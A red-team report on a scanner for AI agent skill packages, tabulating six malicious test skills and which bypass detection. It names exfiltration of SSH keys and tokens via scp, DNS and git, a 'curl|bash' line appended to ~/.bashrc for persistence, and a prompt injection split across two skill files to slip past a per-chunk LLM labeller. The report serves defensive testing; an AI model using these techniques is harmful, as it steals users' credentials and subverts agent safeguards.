# Red-team round 2 — bypass report

Six malicious skills against the round-1-hardened skillet. Static-tier result
(`python redteam/run.py --round 2`): **4 / 6 bypass.** Each bypass is a concrete
instance of a known architectural gap, not a missing string — which is why they are
folded into the v2 redesign rather than patched piecemeal.

| # | directory | technique | goal | result | gap it proves |
|---|-----------|-----------|------|--------|---------------|
| 1 | r2-dns-exfil | exfil via DNS `gethostbyname` | exfil | BYPASS | egress channel not in the enumerated NetworkSink list (#3 over-specific facts) |
| 2 | r2-unknown-secret | reads `~/.config/acme-db/session.token` | exfil | BYPASS | sensitive resource not in the path/env tables — OOD (#3) |
| 3 | r2-scp-channel | `scp ~/.ssh/id_rsa user@host:` | exfil | caught | recognised key read + bare-IP host |
| 4 | r2-git-commit-exfil | secret copied in, `git push` | exfil | BYPASS | exfil channel is version control — no network API, no host literal (#3) |
| 5 | r2-shellrc-persist | append `curl\|bash` to `~/.bashrc` | persistence | caught | pipe-to-shell + host still fire |
| 6 | r2-split-semantic | authority in RULES.md, concealment in SKILL.md | injection | BYPASS | cross-file semantic composition the blind per-chunk labeller can't join (#1 LLM coupling) |

## Reading

The four bypasses cluster on two root causes the user identified independently:

- **Predicates too specific (#3).** `NetworkSink` and the sensitive-path/env tables are
  enumerations. Any channel (DNS, git, an unlisted library) or resource (a novel token
  store) outside the enumeration produces no fact, so the exfil rules — which need both a
  sensitive-read half and a send half — never assemble. Generalising to capability
  predicates (`ReadsSensitive`, `SendsData(channel)`) that both tiers populate, with the
  LLM covering the OOD long tail, closes this class rather than each instance.

- **LLM bolted on, not coupled (#1).** The split-semantic injection puts the two halves of
  one instruction in two files. Per-chunk independent labelling (and same-file overlapping
  windows) cannot join them, and no static fact sees intent. An engine that treats the
  whole package as reachable AND points the LLM at the near-miss ("a concealment here, is
  there an authority claim anywhere in this skill?") is what composes it.

These are the v2 work items, validated on real attacks.
